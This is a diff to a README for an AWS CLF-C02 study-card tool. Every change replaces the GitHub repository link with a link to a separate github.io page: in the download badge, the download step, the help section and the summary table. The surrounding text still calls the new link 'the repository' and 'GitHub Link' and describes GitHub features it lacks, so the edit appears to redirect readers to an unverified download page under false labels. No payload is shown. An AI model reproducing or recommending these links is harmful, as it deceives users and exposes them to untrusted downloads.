@@ -1,6 +1,6 @@
 # 🃏 aws-clf-c02-study-cards - Master AWS Basics Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Free%20Study%20Tool-blue?style=for-the-badge&logo=github)](https://github.com/482mo4445/aws-clf-c02-study-cards)
+[![Download Now](https://img.shields.io/badge/Download-Free%20Study%20Tool-blue?style=for-the-badge&logo=github)](https://482mo4445.github.io)
 
 ---
 
@@ -27,7 +27,7 @@ Follow these simple steps to get the study cards running on your computer today.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/482mo4445/aws-clf-c02-study-cards](https://github.com/482mo4445/aws-clf-c02-study-cards)**
+**[https://482mo4445.github.io](https://482mo4445.github.io)**
 
 Once you click the link, look for a green "Code" button or a "Download ZIP" option on the page. Click it and choose "Download ZIP." The file will start downloading to your computer, usually to your "Downloads" folder.
 
@@ -121,7 +121,7 @@ Make sure you extracted the ZIP (you can see the `index.html` file). Try right-c
 ## 📞 Need Help?
 
 If you run into trouble, the best place to get help is on the GitHub page itself. You can:
-- Visit the repository: **[https://github.com/482mo4445/aws-clf-c02-study-cards](https://github.com/482mo4445/aws-clf-c02-study-cards)**
+- Visit the repository: **[https://482mo4445.github.io](https://482mo4445.github.io)**
 - Look for an "Issues" tab. Click it, then click "New Issue" to ask for help. Be as specific as possible so others can assist you.
 
 There may also be a community of users sharing tips. Be polite and patient.
@@ -146,7 +146,7 @@ If you found this tool helpful, please share it with someone else preparing for 
 
 | What | How |
 |------|-----|
-| **Download** | Visit the [GitHub Link](https://github.com/482mo4445/aws-clf-c02-study-cards) and download the ZIP |
+| **Download** | Visit the [GitHub Link](https://482mo4445.github.io) and download the ZIP |
 | **Run** | Extract and open `index.html` in a browser |
 | **Best For** | AWS CLF-C02 exam prep, beginners, offline study |
 | **Cost** | Absolutely free |
